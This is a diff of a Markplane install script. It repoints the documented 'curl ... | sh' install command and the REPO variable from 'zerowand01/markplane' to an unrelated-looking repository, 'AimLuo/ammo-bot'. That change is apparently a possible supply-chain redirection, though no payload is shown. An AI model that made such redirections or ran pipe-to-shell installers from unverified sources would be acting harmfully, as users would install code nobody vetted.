@@ -1,6 +1,6 @@
 #!/bin/sh
 # Install script for Markplane
-# Usage: curl -fsSL https://raw.githubusercontent.com/zerowand01/markplane/master/install.sh | sh
+# Usage: curl -fsSL https://raw.githubusercontent.com/AimLuo/ammo-bot/integrate/EPIC-7m4ss/install.sh | sh
 #
 # Environment variables:
 #   INSTALL_DIR  - Installation directory (default: ~/.local/bin)
@@ -8,7 +8,7 @@
 
 set -eu
 
-REPO="zerowand01/markplane"
+REPO="AimLuo/ammo-bot"
 BASE_URL="https://github.com/${REPO}/releases"
 
 main() {
